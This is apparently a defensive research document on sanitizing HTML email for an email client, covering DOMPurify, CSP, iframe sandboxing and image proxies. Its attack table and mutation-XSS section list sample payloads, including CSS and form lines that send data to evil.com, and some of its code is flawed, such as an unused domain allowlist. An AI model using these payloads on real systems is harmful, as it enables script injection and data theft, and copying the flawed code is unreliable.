# Email Content Sanitization & XSS Prevention: Research for Claine v2

**Document Version:** 1.0
**Date:** 2025-10-28
**Status:** Research Complete

---

## Executive Summary

### Threat Landscape

Claine v1 exposed critical security vulnerabilities (CVSS 8.1 Stored XSS, CVSS 7.4 CSS injection) stemming from unsafe HTML email rendering without sanitization. Email clients are high-value XSS targets because:

1. **Attack Surface**: HTML emails combine multiple injection vectors (HTML tags, CSS, SVG, inline scripts)
2. **User Trust**: Recipients expect email content to be safe, making social engineering easier
3. **Persistent Storage**: Stored XSS in emails affects all users viewing the message
4. **Sensitive Context**: Email clients access authentication tokens, personal data, and contacts

**Critical Risks Identified:**
- **Mutation XSS (mXSS)**: Browser parser confusion bypasses sanitizers by transforming "safe" markup into executable code
- **CSS Data Exfiltration**: Attribute selectors + background-image requests leak form values character-by-character
- **SVG-Based XSS**: `<svg>` tags execute JavaScript via `<script>` children or event handlers
- **Tracking Pixels**: 1x1 transparent images reveal user IP, location, device, and read timestamps
- **Token Theft**: XSS + localStorage tokens = account takeover (CVSS 8.1)

### Key Findings

Nearly all major webmail platforms (Microsoft Hotmail, Yahoo! Mail, Roundcube, OpenExchange) were historically vulnerable to mXSS attacks due to reliance on `innerHTML` for rendering user-generated content. Modern solutions require **defense-in-depth**:

1. **Client-side sanitization** (DOMPurify) as primary defense
2. **Content Security Policy (CSP)** headers to restrict execution contexts
3. **Iframe sandboxing** to isolate email content from application context
4. **Image proxies** to block tracking and hide user metadata
5. **Trusted Types API** to lock down DOM XSS sinks

---

## HTML Sanitization Libraries Comparison

### Feature Matrix

| Feature | **DOMPurify** | sanitize-html | js-xss |
|---------|---------------|---------------|--------|
| **Primary Use Case** | Client-side DOM XSS prevention | Server-side/Node.js customizable filtering | Whitelist-based XSS filtering |
| **Environment** | Browser + Node.js (jsdom) | Node.js (can bundle for browser) | Browser + Node.js |
| **Performance** | Fast (DOM-only, native parser) | Moderate (htmlparser2) | Moderate |
| **Bundle Size** | ~19KB minified | ~40KB+ (with dependencies) | ~12KB minified |
| **Default Security** | Secure by default (denylisting) | Requires configuration | Secure by default |
| **Email Safety** | Excellent (mXSS protection) | Good (custom rules needed) | Good (basic protection) |
| **Mutation XSS Protection** | Yes (actively patched) | Partial (config-dependent) | Limited |
| **CSS Sanitization** | Yes (strips dangerous styles) | Yes (configurable) | Yes (basic) |
| **SVG Handling** | Yes (strips scripts) | Requires manual config | Limited |
| **Custom Hooks** | Yes (extensive API) | Yes (transformTags) | Limited |
| **React Integration** | Excellent (dangerouslySetInnerHTML) | Good (SSR-friendly) | Basic |
| **Active Maintenance** | Very active (v3.3.0+) | Active | Moderate |
| **NPM Weekly Downloads** | ~7M | ~3M | ~400K |
| **Security Audits** | Cure53 (professional) | Community | Community |
| **Email Client Use** | Recommended for webmail | Used in CMS/email systems | Legacy systems |

### Recommendation for Claine v2

**Primary Choice: DOMPurify v3.3.0+**

**Rationale:**
1. **Security-first design**: Built specifically for XSS prevention with professional security audits by Cure53
2. **Mutation XSS protection**: Actively patches mXSS bypasses (critical for email rendering)
3. **Performance**: DOM-native parsing is faster than regex/string-based alternatives
4. **Browser compatibility**: Works in all modern browsers (Safari 10+, Chrome, Firefox, Edge)
5. **React-friendly**: Direct integration with `dangerouslySetInnerHTML`
6. **Hooks system**: Allows custom handling of email-specific features (CID images, tracking pixel blocking)

**Secondary/Complementary: sanitize-html**
- Use for **server-side pre-processing** before storage (defense-in-depth)
- Provides fine-grained tag/attribute whitelisting for email templates
- Reduces client-side processing load for large email bodies

---

## Email-Specific Attack Vectors

### Attack Matrix

| Attack Vector | Severity | Description | Example Payload | Defense |
|---------------|----------|-------------|-----------------|---------|
| **Classic XSS** | Critical | Script tags, event handlers, javascript: URLs | `<img src=x onerror=alert(1)>` | DOMPurify sanitization |
| **Mutation XSS (mXSS)** | Critical | Parser confusion transforms safe→malicious markup | `<svg><style><img src=x onerror=alert(1)//` | DOMPurify v3+ with mXSS patches |
| **CSS Injection** | High | Attribute selectors exfiltrate form data | `input[value^=a]{background:url(//evil.com/a)}` | Strip `<style>` tags, CSP `style-src` |
| **SVG Script Execution** | Critical | `<svg><script>` tags execute JS | `<svg><script>alert(1)</script></svg>` | Remove `<script>` inside SVG, DOMPurify |
| **CSS `@import` Exfiltration** | Medium | Import external stylesheets to leak data | `<style>@import url(//evil.com/steal)</style>` | CSP `style-src 'self'`, strip `@import` |
| **Data URI XSS** | High | Base64-encoded scripts in `data:` URLs | `<img src="data:text/html,<script>alert(1)</script>">` | Sanitize `src` attributes, block `data:` URIs |
| **Tracking Pixels** | Medium | 1x1 images track opens, IP, device | `<img src="https://tracker.com/pixel?id=user123" width="1" height="1">` | Image proxy, block external images |
| **CSS `content` Attribute** | Low | Display malicious text via CSS | `a:after{content:"Click here for prize!"}` | Sanitize `content` property |
| **Link Spoofing** | Medium | Display text doesn't match `href` | `<a href="evil.com">Click bank.com</a>` | Client-side link preview/validation |
| **Form Hijacking** | High | Hidden forms POST to attacker server | `<form action="//evil.com"><input name="password">` | Remove `<form>` tags entirely |
| **Meta Refresh Redirect** | Medium | Auto-redirect to phishing page | `<meta http-equiv="refresh" content="0;url=evil.com">` | Strip `<meta>` tags in email body |
| **Object/Embed XSS** | High | Flash/plugin-based XSS (legacy) | `<object data="evil.swf"></object>` | Remove `<object>`, `<embed>`, `<applet>` |

### Mutation XSS Deep Dive

**How mXSS Works:**

Mutation XSS exploits differences between sanitizer parsing and browser rendering:

1. **Sanitizer Stage**: Parses HTML string as benign (e.g., `<svg><style><img src=x>`)
2. **Browser Stage**: Re-parses after `innerHTML` assignment, treating `<img>` as executable HTML
3. **Result**: `onerror` handler fires, executing arbitrary JavaScript

**Critical mXSS Patterns:**
```html
<!-- Namespace confusion -->
<svg><style><img src=x onerror=alert(1)//</style></svg>

<!-- Template element -->
<template><script>alert(1)</script></template>

<!-- MathML mutation -->
<math><mtext><table><mglyph></table></mtext><script>alert(1)</script></math>

<!-- Noscript mutation (when JS disabled in sanitizer, enabled in browser) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**DOMPurify Protection:**
- Parses HTML using **real browser DOM** (not string manipulation)
- Applies **allowlist-based filtering** on parsed DOM tree
- Re-serializes safe DOM to string (no re-parsing mutations)
- Patches mXSS bypasses within 24-48 hours of disclosure

---

## Defense Strategies Implementation

### 1. DOMPurify Configuration for Email

#### Basic React Integration

```jsx
// EmailViewer.jsx
import React from 'react';
import DOMPurify from 'dompurify';

const EmailViewer = ({ emailHtml }) => {
  // Configure DOMPurify for email safety
  const sanitizeConfig = {
    ALLOWED_TAGS: [
      // Text formatting
      'p', 'br', 'span', 'div', 'blockquote', 'pre', 'code',
      // Styling
      'b', 'i', 'u', 'strong', 'em', 's', 'strike', 'del', 'mark', 'small',
      // Lists
      'ul', 'ol', 'li', 'dl', 'dt', 'dd',
      // Tables
      'table', 'thead', 'tbody', 'tfoot', 'tr', 'td', 'th', 'caption',
      // Headings
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      // Links and images
      'a', 'img',
      // Semantic HTML
      'article', 'section', 'header', 'footer', 'aside', 'nav'
    ],
    ALLOWED_ATTR: [
      // Styling
      'style', 'class',
      // Links
      'href', 'target', 'rel',
      // Images
      'src', 'alt', 'width', 'height',
      // Tables
      'colspan', 'rowspan', 'align', 'valign',
      // Accessibility
      'title', 'aria-label', 'role'
    ],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
    ALLOW_DATA_ATTR: false, // Block data-* attributes (tracking)
    ALLOW_UNKNOWN_PROTOCOLS: false,
    FORBID_TAGS: ['style', 'script', 'form', 'input', 'textarea', 'select', 'button', 'object', 'embed', 'applet', 'meta', 'link', 'base'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'formaction'],
    KEEP_CONTENT: true, // Keep text content when removing tags
    RETURN_DOM: false,
    RETURN_DOM_FRAGMENT: false,
    RETURN_TRUSTED_TYPE: false,
    SANITIZE_DOM: true, // Enable DOM sanitization (mXSS protection)
    SAFE_FOR_TEMPLATES: false, // Not using template engines
    WHOLE_DOCUMENT: false,
    FORCE_BODY: false
  };

  // Sanitize email HTML
  const sanitizedHtml = DOMPurify.sanitize(emailHtml, sanitizeConfig);

  return (
    <div
      className="email-content"
      dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
    />
  );
};

export default EmailViewer;
```

#### Advanced Configuration with Hooks

```javascript
// emailSanitizer.js
import DOMPurify from 'dompurify';

class EmailSanitizer {
  constructor(imageProxyUrl = '/api/image-proxy') {
    this.imageProxyUrl = imageProxyUrl;
    this.setupHooks();
  }

  setupHooks() {
    // Hook 1: Proxy all external images (tracking protection)
    DOMPurify.addHook('afterSanitizeAttributes', (node) => {
      if (node.nodeName === 'IMG') {
        const src = node.getAttribute('src');

        // Proxy external images
        if (src && (src.startsWith('http://') || src.startsWith('https://'))) {
          const proxiedUrl = `${this.imageProxyUrl}?url=${encodeURIComponent(src)}`;
          node.setAttribute('src', proxiedUrl);

          // Add loading indicator
          node.setAttribute('loading', 'lazy');
        }

        // Block data URIs (potential XSS)
        if (src && src.startsWith('data:')) {
          node.removeAttribute('src');
        }

        // Handle CID images (email attachments)
        if (src && src.startsWith('cid:')) {
          const cid = src.substring(4);
          node.setAttribute('src', `/api/email/attachment/${cid}`);
        }
      }

      // Sanitize links
      if (node.nodeName === 'A') {
        const href = node.getAttribute('href');

        // Force external links to open in new tab with security
        if (href && !href.startsWith('#') && !href.startsWith('/')) {
          node.setAttribute('target', '_blank');
          node.setAttribute('rel', 'noopener noreferrer');
        }

        // Block javascript: and data: URLs
        if (href && (href.startsWith('javascript:') || href.startsWith('data:'))) {
          node.removeAttribute('href');
        }
      }
    });

    // Hook 2: Sanitize CSS styles
    DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
      if (data.attrName === 'style') {
        // Block dangerous CSS properties
        const dangerousPatterns = [
          /expression\(/i,        // IE expression()
          /javascript:/i,         // javascript: URLs
          /vbscript:/i,           // VBScript URLs
          /import/i,              // @import rules
          /behavior:/i,           // IE behaviors
          /-moz-binding/i,        // XBL bindings
          /position:\s*fixed/i,   // Fixed positioning (overlay attacks)
          /position:\s*absolute/i // Absolute positioning (clickjacking)
        ];

        const hasBlockedPattern = dangerousPatterns.some(pattern =>
          pattern.test(data.attrValue)
        );

        if (hasBlockedPattern) {
          data.keepAttr = false;
        }
      }
    });

    // Hook 3: Track blocked elements for security logging
    DOMPurify.addHook('uponSanitizeElement', (node, data) => {
      if (data.tagName === 'script' || data.tagName === 'style') {
        console.warn('[EmailSanitizer] Blocked dangerous tag:', data.tagName);
        // Could send to security monitoring service
      }
    });
  }

  sanitize(html, customConfig = {}) {
    const defaultConfig = {
      ALLOWED_TAGS: ['p', 'br', 'span', 'div', 'b', 'i', 'u', 'strong', 'em',
                     'a', 'img', 'ul', 'ol', 'li', 'table', 'tr', 'td', 'th',
                     'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code'],
      ALLOWED_ATTR: ['style', 'class', 'href', 'src', 'alt', 'width', 'height',
                     'target', 'rel', 'title', 'colspan', 'rowspan'],
      ALLOW_DATA_ATTR: false,
      SANITIZE_DOM: true
    };

    const config = { ...defaultConfig, ...customConfig };
    return DOMPurify.sanitize(html, config);
  }

  // Clean up hooks (call on unmount)
  destroy() {
    DOMPurify.removeHooks('afterSanitizeAttributes');
    DOMPurify.removeHooks('uponSanitizeAttribute');
    DOMPurify.removeHooks('uponSanitizeElement');
  }
}

export default EmailSanitizer;
```

### 2. Content Security Policy (CSP) Headers

#### Strict CSP for Email Client

```javascript
// server/middleware/csp.js
export const emailClientCSP = (req, res, next) => {
  // Strict CSP for email viewing page
  res.setHeader('Content-Security-Policy', [
    // Scripts: Only from same origin, no inline scripts, no eval
    "script-src 'self'",

    // Styles: Same origin + nonce for inline styles
    "style-src 'self' 'nonce-{RANDOM_NONCE}'",

    // Images: Same origin + proxied images
    "img-src 'self' data: blob: https://image-proxy.claine.app",

    // Fonts: Same origin only
    "font-src 'self'",

    // AJAX/Fetch: Same origin only
    "connect-src 'self' https://api.claine.app",

    // Frames: None (prevent clickjacking)
    "frame-src 'none'",

    // Objects: None (block Flash, Java, etc.)
    "object-src 'none'",

    // Media: None in email context
    "media-src 'none'",

    // Forms: Only submit to same origin
    "form-action 'self'",

    // Frame ancestors: Prevent embedding (clickjacking)
    "frame-ancestors 'none'",

    // Base URI: Restrict to same origin
    "base-uri 'self'",

    // Upgrade insecure requests
    "upgrade-insecure-requests",

    // Block all mixed content
    "block-all-mixed-content",

    // Default fallback
    "default-src 'none'"
  ].join('; '));

  // Additional security headers
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  next();
};
```

#### CSP with Trusted Types (Advanced)

```javascript
// Enable Trusted Types for DOM XSS protection
export const trustedTypesCSP = (req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "script-src 'self'",
    "style-src 'self'",
    "img-src 'self' https://image-proxy.claine.app",
    "object-src 'none'",

    // Require Trusted Types for DOM sinks
    "require-trusted-types-for 'script'",

    // Define allowed Trusted Types policies
    "trusted-types dompurify default",

    "default-src 'self'"
  ].join('; '));

  next();
};
```

### 3. Iframe Sandboxing for Email Isolation

```jsx
// EmailIframeViewer.jsx
import React, { useRef, useEffect } from 'react';
import DOMPurify from 'dompurify';

const EmailIframeViewer = ({ emailHtml }) => {
  const iframeRef = useRef(null);

  useEffect(() => {
    if (iframeRef.current) {
      const iframe = iframeRef.current;
      const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

      // Sanitize HTML before injection
      const sanitizedHtml = DOMPurify.sanitize(emailHtml, {
        ALLOWED_TAGS: ['p', 'br', 'span', 'div', 'b', 'i', 'u', 'strong', 'em',
                       'a', 'img', 'ul', 'ol', 'li', 'table', 'tr', 'td', 'th'],
        ALLOWED_ATTR: ['style', 'href', 'src', 'alt', 'width', 'height'],
        SANITIZE_DOM: true
      });

      // Build complete HTML document with CSP meta tag
      const iframeContent = `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src https: data:;">
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
              font-size: 14px;
              line-height: 1.6;
              color: #333;
              margin: 16px;
              word-wrap: break-word;
            }
            a {
              color: #0066cc;
              text-decoration: none;
            }
            a:hover {
              text-decoration: underline;
            }
            img {
              max-width: 100%;
              height: auto;
            }
          </style>
        </head>
        <body>
          ${sanitizedHtml}
        </body>
        </html>
      `;

      iframeDoc.open();
      iframeDoc.write(iframeContent);
      iframeDoc.close();
    }
  }, [emailHtml]);

  return (
    <iframe
      ref={iframeRef}
      title="Email Content"
      sandbox="allow-same-origin" // Minimal permissions
      style={{
        width: '100%',
        minHeight: '400px',
        border: '1px solid #e0e0e0',
        borderRadius: '4px'
      }}
    />
  );
};

export default EmailIframeViewer;
```

**Sandbox Attribute Explanation:**

```html
<!-- Minimal permissions (safest) -->
<iframe sandbox="allow-same-origin"></iframe>

<!-- If email needs to load images/styles from same origin -->
<iframe sandbox="allow-same-origin"></iframe>

<!-- NEVER use these for untrusted email content -->
<!--
  allow-scripts: Enables JavaScript execution (DANGEROUS)
  allow-forms: Allows form submission (TRACKING RISK)
  allow-popups: Allows window.open() (PHISHING RISK)
  allow-top-navigation: Allows changing parent page URL (DANGEROUS)
-->
```

### 4. Image Proxy Implementation

```javascript
// server/routes/imageProxy.js
import express from 'express';
import fetch from 'node-fetch';
import crypto from 'crypto';
import sharp from 'sharp'; // Image processing library

const router = express.Router();

// HMAC signing to prevent proxy abuse
const signUrl = (url) => {
  const secret = process.env.IMAGE_PROXY_SECRET;
  const hmac = crypto.createHmac('sha256', secret);
  hmac.update(url);
  return hmac.digest('hex');
};

const verifySignature = (url, signature) => {
  return signUrl(url) === signature;
};

router.get('/image-proxy', async (req, res) => {
  try {
    const { url, sig } = req.query;

    // Validate signature (prevent proxy abuse)
    if (!url || !sig || !verifySignature(url, sig)) {
      return res.status(403).json({ error: 'Invalid signature' });
    }

    // Whitelist allowed domains (optional)
    const allowedDomains = [
      'amazonaws.com',
      'cloudinary.com',
      'imgix.net'
      // Add trusted image CDNs
    ];

    const urlObj = new URL(url);
    const isAllowedDomain = allowedDomains.some(domain =>
      urlObj.hostname.endsWith(domain)
    );

    // Fetch image with timeout
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000); // 5s timeout

    const response = await fetch(url, {
      signal: controller.signal,
      headers: {
        'User-Agent': 'ClaineMail/2.0 ImageProxy',
        // Don't forward user's cookies/auth
      }
    });

    clearTimeout(timeout);

    if (!response.ok) {
      return res.status(404).send('Image not found');
    }

    // Validate content type
    const contentType = response.headers.get('content-type');
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/svg+xml'];

    if (!allowedTypes.includes(contentType)) {
      return res.status(400).send('Invalid image type');
    }

    // Stream image through Sharp for additional safety (strips EXIF, validates format)
    const imageBuffer = await response.arrayBuffer();
    const processedImage = await sharp(Buffer.from(imageBuffer))
      .resize(2000, 2000, { // Max dimensions
        fit: 'inside',
        withoutEnlargement: true
      })
      .jpeg({ quality: 85 }) // Convert to JPEG (safer than SVG)
      .toBuffer();

    // Set cache headers
    res.set({
      'Content-Type': 'image/jpeg',
      'Cache-Control': 'public, max-age=86400', // 24 hours
      'X-Content-Type-Options': 'nosniff'
    });

    res.send(processedImage);

  } catch (error) {
    console.error('[ImageProxy] Error:', error);
    res.status(500).send('Proxy error');
  }
});

export default router;
```

**Client-Side Usage:**

```javascript
// utils/imageProxy.js
export const getProxiedImageUrl = (originalUrl) => {
  if (!originalUrl || originalUrl.startsWith('data:')) {
    return null; // Block data URIs
  }

  const signature = signUrl(originalUrl); // Client-side signing (requires shared secret or JWT)
  return `/api/image-proxy?url=${encodeURIComponent(originalUrl)}&sig=${signature}`;
};
```

### 5. Trusted Types Implementation

```javascript
// trustedTypes.js - Initialize Trusted Types policy
if (window.trustedTypes && trustedTypes.createPolicy) {
  // Create DOMPurify policy
  trustedTypes.createPolicy('dompurify', {
    createHTML: (input) => {
      return DOMPurify.sanitize(input, {
        RETURN_TRUSTED_TYPE: true,
        SANITIZE_DOM: true
      });
    }
  });

  // Create default policy as fallback
  trustedTypes.createPolicy('default', {
    createHTML: (input) => {
      console.warn('[TrustedTypes] Unsafe HTML detected, sanitizing:', input.substring(0, 100));
      return DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true });
    },
    createScriptURL: (input) => {
      // Only allow same-origin scripts
      if (input.startsWith('/') || input.startsWith(window.location.origin)) {
        return input;
      }
      throw new TypeError('Invalid script URL');
    },
    createScript: (input) => {
      throw new TypeError('Inline scripts not allowed');
    }
  });
}
```

---

## Real-World Email Client Security Implementations

### Gmail

**Security Measures:**
1. **Image Proxy**: All images routed through `googleusercontent.com` proxy
   - Strips EXIF metadata
   - Hides user IP/location/user-agent
   - Caches images (prevents real-time tracking)

2. **Sanitization**: Aggressive HTML filtering
   - Removes `<script>`, `<style>`, `<object>`, `<embed>`, `<form>` tags
   - Strips event handlers (`onclick`, `onerror`, etc.)
   - Blocks `javascript:` and `data:` URLs

3. **Sandboxing**: Email content rendered in restricted context
   - No access to main Gmail application state
   - Limited CSS support (no `position: fixed`, no `@import`)

4. **CSP Headers**: Strict Content-Security-Policy
   - `script-src 'none'` (no JavaScript execution)
   - `object-src 'none'` (no plugins)

5. **Link Protection**: Outbound link warnings
   - Shows preview of destination URL
   - Warns for suspicious domains

**Takeaway for Claine v2**: Gmail's defense-in-depth approach combines sanitization + proxying + sandboxing + CSP.

---

### ProtonMail

**Security Measures:**
1. **End-to-End Encryption**: Email body encrypted client-side (prevents server-side XSS)

2. **Tracking Protection**:
   - Blocks known tracking pixels by default
   - Proxies remaining images through Proton servers
   - Generic IP and geolocation in proxy requests

3. **HTML Sanitization**: DOMPurify-based filtering
   - Removes scripts, forms, external resources
   - Strips dangerous CSS properties

4. **Embedded Content Blocking**:
   - Images load on-demand (not automatic)
   - User controls remote content loading

5. **Link Safety**: Shows destination URL preview before opening

**Takeaway for Claine v2**: ProtonMail prioritizes user privacy + security, giving users control over remote content.

---

### Outlook (Microsoft 365)

**Security Measures:**
1. **SafeLinks**: URL rewriting for phishing protection
   - Scans links at click-time for malicious content
   - Warns users before navigating to suspicious sites

2. **SafeAttachments**: Sandbox execution for attachments
   - Opens attachments in isolated VM environment
   - Scans for malware before delivery

3. **Advanced Threat Protection (ATP)**:
   - Machine learning detects phishing campaigns
   - Analyzes email headers, body, attachments

4. **HTML Rendering**: Uses Word HTML rendering engine
   - Limited CSS support (reduces attack surface)
   - Strips active content (scripts, forms, objects)

5. **Image Blocking**: External images blocked by default
   - User must explicitly allow image loading
   - No automatic tracking pixel execution

**Takeaway for Claine v2**: Outlook's ATP shows value of server-side threat intelligence + client-side protection.

---

## Security Implementation Checklist

### Phase 1: Immediate Mitigations (Week 1)

- [ ] **Install DOMPurify v3.3.0+**
  ```bash
  npm install dompurify @types/dompurify
  ```

- [ ] **Replace all `dangerouslySetInnerHTML` with sanitized version**
  ```jsx
  // Before (VULNERABLE)
  <div dangerouslySetInnerHTML={{ __html: emailHtml }} />

  // After (SAFE)
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(emailHtml) }} />
  ```

- [ ] **Add CSP headers to email viewing routes**
  - Minimum: `script-src 'self'; object-src 'none'`

- [ ] **Remove tokens from localStorage** (CVSS 8.1 fix)
  - Migrate to `httpOnly` cookies with `SameSite=Strict`
  - Use refresh token rotation

- [ ] **Block external images by default**
  - Require user consent to load remote content

### Phase 2: Sandboxing & Isolation (Week 2-3)

- [ ] **Implement iframe sandboxing for email body**
  - Use `sandbox="allow-same-origin"` attribute
  - Inject sanitized HTML into iframe document

- [ ] **Add CSP meta tags inside iframe**
  ```html
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'none'; style-src 'unsafe-inline'; img-src https:">
  ```

- [ ] **Configure DOMPurify with email-specific rules**
  - Whitelist safe tags: `p`, `div`, `span`, `a`, `img`, `table`, etc.
  - Block dangerous tags: `script`, `style`, `form`, `object`, `embed`
  - Strip event handlers and `javascript:` URLs

- [ ] **Add DOMPurify hooks for custom handling**
  - CID image resolution (`cid:` URLs → attachment endpoints)
  - External link warnings (add visual indicator)

### Phase 3: Image Proxy & Tracking Prevention (Week 3-4)

- [ ] **Build image proxy server endpoint**
  - Route: `GET /api/image-proxy?url=<encoded_url>&sig=<hmac>`
  - Validate HMAC signature (prevent abuse)
  - Fetch image with timeout (5s max)
  - Strip EXIF metadata
  - Cache responses (24h)

- [ ] **Update DOMPurify hooks to rewrite image URLs**
  ```javascript
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.nodeName === 'IMG') {
      const src = node.getAttribute('src');
      if (src && src.startsWith('http')) {
        node.setAttribute('src', `/api/image-proxy?url=${encodeURIComponent(src)}&sig=...`);
      }
    }
  });
  ```

- [ ] **Add user control for loading remote images**
  - Show banner: "This email contains external images. Load images?"
  - Save user preference per sender

### Phase 4: Advanced Protections (Week 4-5)

- [ ] **Implement Trusted Types API** (if supporting Chrome/Edge only)
  - Create `dompurify` policy
  - Set `RETURN_TRUSTED_TYPE: true` in DOMPurify config

- [ ] **Add server-side sanitization** (defense-in-depth)
  - Use `sanitize-html` on Node.js before storing emails
  - Reduces client-side processing load

- [ ] **CSS Sanitization**
  - Strip `<style>` tags entirely (safest approach)
  - OR: Whitelist safe CSS properties (complex)

- [ ] **Link safety features**
  - Show link preview tooltip on hover
  - Warn for mismatched display text vs. `href`
  - Add outbound link confirmation modal

- [ ] **Security monitoring**
  - Log sanitizer blocked elements (track attack attempts)
  - Alert on suspicious patterns (high volume of blocked content)

### Phase 5: Testing & Validation (Ongoing)

- [ ] **XSS Payload Testing**
  - Test against OWASP XSS payload list
  - Test mXSS patterns from PortSwigger research
  - Test CSS injection vectors

- [ ] **Browser Compatibility Testing**
  - Chrome, Firefox, Safari, Edge (latest 2 versions)
  - Test iframe sandboxing behavior

- [ ] **Performance Testing**
  - Measure DOMPurify sanitization time for large emails (>100KB)
  - Optimize with Web Workers if needed

- [ ] **Penetration Testing**
  - Hire security researcher for bug bounty
  - Test email upload → storage → rendering pipeline

- [ ] **Dependency Updates**
  - Monitor DOMPurify releases (mXSS bypass patches)
  - Automated security updates via Dependabot

---

## Recommendations for Claine v2

### Architecture Decisions

#### 1. **Defense-in-Depth Strategy**

Implement multiple security layers (don't rely on single control):

```
┌─────────────────────────────────────────────┐
│  Layer 1: Server-Side Sanitization         │
│  ├─ sanitize-html on Node.js before DB     │
│  └─ Strips obvious XSS on ingestion        │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│  Layer 2: Secure Storage                    │
│  ├─ Store sanitized HTML in PostgreSQL     │
│  └─ Use parameterized queries (no SQL inj) │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│  Layer 3: Client-Side Sanitization         │
│  ├─ DOMPurify v3.3.0+ before rendering     │
│  └─ Defense against DB compromise          │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│  Layer 4: Iframe Isolation                  │
│  ├─ Sandbox email in iframe                │
│  └─ Prevent access to parent context       │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│  Layer 5: CSP Headers                       │
│  ├─ script-src 'self' (block inline JS)    │
│  └─ object-src 'none' (block plugins)      │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│  Layer 6: Image Proxy                       │
│  ├─ Proxy all external images              │
│  └─ Block tracking pixels, hide user IP    │
└─────────────────────────────────────────────┘
```

#### 2. **Token Storage Migration** (Critical - CVSS 8.1)

**Current Risk**: Tokens in `localStorage` are accessible to XSS attacks.

**Solution**:
```javascript
// BEFORE (VULNERABLE)
localStorage.setItem('accessToken', token);

// AFTER (SECURE)
// 1. Store refresh token in httpOnly cookie (server-side set)
res.cookie('refreshToken', token, {
  httpOnly: true,       // Not accessible to JavaScript
  secure: true,         // HTTPS only
  sameSite: 'strict',   // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

// 2. Store access token in memory (React context/state)
// - Expires after 15 minutes
// - Lost on page refresh (re-fetch via refresh token)
const AuthContext = createContext();
```

#### 3. **Image Loading Strategy**

**Recommended**: Opt-in image loading with proxy

```jsx
const EmailViewer = ({ emailHtml, sender }) => {
  const [imagesEnabled, setImagesEnabled] = useState(false);
  const [trustedSenders, setTrustedSenders] = useState([]);

  const isTrustedSender = trustedSenders.includes(sender.email);

  useEffect(() => {
    // Auto-load images for trusted senders (contacts, whitelisted domains)
    if (isTrustedSender) {
      setImagesEnabled(true);
    }
  }, [sender, isTrustedSender]);

  const sanitizeConfig = {
    ...baseConfig,
    // Block images if not enabled
    FORBID_TAGS: imagesEnabled ? [] : ['img'],
  };

  return (
    <div>
      {!imagesEnabled && !isTrustedSender && (
        <div className="image-banner">
          <p>External images blocked for privacy.</p>
          <button onClick={() => setImagesEnabled(true)}>Load Images</button>
          <button onClick={() => addTrustedSender(sender.email)}>
            Always load from {sender.email}
          </button>
        </div>
      )}
      <div dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(emailHtml, sanitizeConfig)
      }} />
    </div>
  );
};
```

#### 4. **CSS Handling**

**Recommendation**: Strip `<style>` tags entirely (safest)

CSS injection is difficult to defend against because:
- Attribute selectors can exfiltrate form values
- `@import` can load external resources
- `position: fixed` can create overlay attacks

**If CSS is required** (for email formatting):
- Use CSS-in-JS with sanitized inline styles only
- Whitelist safe properties: `color`, `font-size`, `text-align`, `padding`, `margin`
- Block: `position`, `background-image`, `content`, `@import`

```javascript
const sanitizeCssProperty = (prop, value) => {
  const allowedProps = ['color', 'font-size', 'text-align', 'padding', 'margin', 'font-weight'];
  const blockedPatterns = [/url\(/i, /expression\(/i, /javascript:/i, /@import/i];

  if (!allowedProps.includes(prop)) return null;
  if (blockedPatterns.some(p => p.test(value))) return null;

  return `${prop}: ${value}`;
};
```

#### 5. **Monitoring & Incident Response**

```javascript
// securityMonitoring.js
class SecurityMonitor {
  logSanitization(emailId, blockedElements) {
    if (blockedElements.length > 0) {
      console.warn(`[Security] Email ${emailId} contained blocked elements:`, blockedElements);

      // Send to security monitoring service
      fetch('/api/security/report', {
        method: 'POST',
        body: JSON.stringify({
          type: 'XSS_ATTEMPT',
          emailId,
          blockedElements,
          timestamp: new Date().toISOString()
        })
      });
    }
  }

  trackMaliciousSender(senderEmail) {
    // Flag sender for review after multiple XSS attempts
    // Could auto-quarantine emails from this sender
  }
}
```

### Performance Considerations

**DOMPurify Performance**:
- Typical sanitization: **< 1ms** for small emails (< 10KB)
- Large emails (> 100KB): **5-10ms**
- Use Web Workers for emails > 500KB (avoid UI blocking)

```javascript
// emailWorker.js (Web Worker for large emails)
importScripts('https://cdn.jsdelivr.net/npm/dompurify@3.3.0/dist/purify.min.js');

self.onmessage = (e) => {
  const { html, config } = e.data;
  const sanitized = DOMPurify.sanitize(html, config);
  self.postMessage({ sanitized });
};
```

### Migration Path from v1 to v2

**Phase 1: Backward-Compatible Fixes** (No breaking changes)
1. Add DOMPurify sanitization to existing email rendering
2. Migrate tokens from localStorage to httpOnly cookies
3. Add CSP headers to email routes
4. Deploy image proxy server

